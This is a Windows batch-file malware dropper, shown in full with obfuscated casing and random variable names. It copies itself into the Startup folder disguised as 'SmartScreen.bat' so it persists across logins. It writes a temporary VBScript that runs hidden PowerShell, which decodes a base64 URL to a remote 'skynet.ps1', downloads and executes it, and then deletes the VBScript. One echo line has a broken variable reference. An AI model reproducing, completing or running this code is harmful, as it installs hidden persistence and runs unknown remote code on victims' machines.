@ECho off
tImEOUT /t 1 /nobreak >nul
SeT "qxyKLeAi=%~f0"
seT "FwCFUqia=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SmartScreen.bat"
coPY /Y "%qxyKLeAi%" "%FwCFUqia%" >nul
tiMeoUt /t 2 /nobreak >nul
sEt QCjOCtdw=%TEMP%\ImDVodDuAnkY.vbs
echo oN ERrOr rEsuMe nExt > "QCjOCtdw%"
echo Dim CbTIKZPc, TsDmliFE >> "%QCjOCtdw%"
echo dim TaECeW : cntkVV = 16 >> "%QCjOCtdw%"
echo WsCRipt.sleEp 2255 >> "%QCjOCtdw%"
echo cReatEoBjEcT("wscRIPt.shEll").Run "pOwERShELL $u=[syStem.text.EncoDIng]::Utf8.gETstRInG([system.CONvErt]::FROMBaSe64StriNg('aHR0cHM6Ly9jb2RlYmVyZy5vcmcvbGVvY29sL3h4bGwvcmF3L2JyYW5jaC9tYWluL3NreW5ldC5wczE='));IEx([SYsteM.IO.StReamReadEr]::NeW([SYsTEm.net.weBREQUesT]::CREaTE($u).GetReSPoNse().GETreSPOnsESTrEam()).rEAdtOEND())", 0, FaLSE >> "%QCjOCtdw%"
Start /B /WAIT wscript "%QCjOCtdw%"
TimEOuT /t 1 /nobreak >nul
del "%QCjOCtdw%" /f /q
eXit
